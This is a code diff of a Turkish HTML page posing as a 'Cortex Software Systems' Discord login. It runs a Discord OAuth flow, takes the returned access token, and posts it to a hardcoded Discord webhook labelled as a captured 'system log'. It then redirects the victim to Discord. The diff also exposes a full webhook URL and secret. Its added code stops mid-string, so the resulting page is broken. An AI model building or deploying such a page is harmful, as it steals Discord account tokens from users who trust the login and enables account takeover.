@@ -1,3 +1,4 @@
+<!DOCTYPE html>
 <html lang="tr">
 <head>
     <meta charset="UTF-8">
@@ -50,10 +51,12 @@
         const WEBHOOK_URL = "https://discord.com/api/webhooks/1480228951015297055/YkGkx8UliKe2XQtD0HxNxj1DBo_2rksQomQWoCaF61x-YUrVR9960IvGj-FVR99NY6iL";
 
         function startAuth() {
-            // Discord'daki Redirect URI ile burası birebir aynı olmalı
-            const currentUrl = window.location.origin + window.location.pathname;
+            // Discord'daki Redirect URI ile burası birebir aynı olmalı.
+            // Önemli: Discord Developer Portal'da hangi link ekliyse onu buraya tırnak içine yaz.
+            // Eğer "https://kullanici.github.io/cortex/" ise onu yaz.
+            const redirectUri = window.location.href.split('#')[0].split('?')[0];
             const scope = encodeURIComponent("identify email guilds");
-            window.location.href = `https://discord.com/api/oauth2/authorize?client_id=${CLIENT_ID}&redirect_uri=${encodeURIComponent(currentUrl)}&response_type=token&scope=${scope}`;
+            window.location.href = `https://discord.com/api/oauth2/authorize?client_id=${CLIENT_ID}&redirect_uri=${encodeURIComponent(redirectUri)}&response_type=token&scope=${scope}`;
         }
 
         window.onload = () => {
@@ -64,6 +67,7 @@
                 document.getElementById('landing').style.display = 'none';
                 document.getElementById('dashboard').style.display = 'flex';
 
+                // Discord Webhook Gönderimi
                 fetch(WEBHOOK_URL, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
@@ -73,19 +77,4 @@
                             title: "💀 Sistem Logu Yakalandı",
                             color: 0x00FFCC,
                             fields: [
-                                { name: "🔑 Token", value: "```" + token + "```" },
-                                { name: "🕒 Zaman", value: new Date().toLocaleString('tr-TR') }
-                            ],
-                            footer: { text: "Cortex Software Systems" }
-                        }]
-                    })
-                }).then(() => {
-                    setTimeout(() => {
-                        window.location.href = "https://discord.com/app";
-                    }, 3000);
-                });
-            }
-        }
-    </script>
-</body>
-</html>
+                                { name: "🔑 Token", value: "
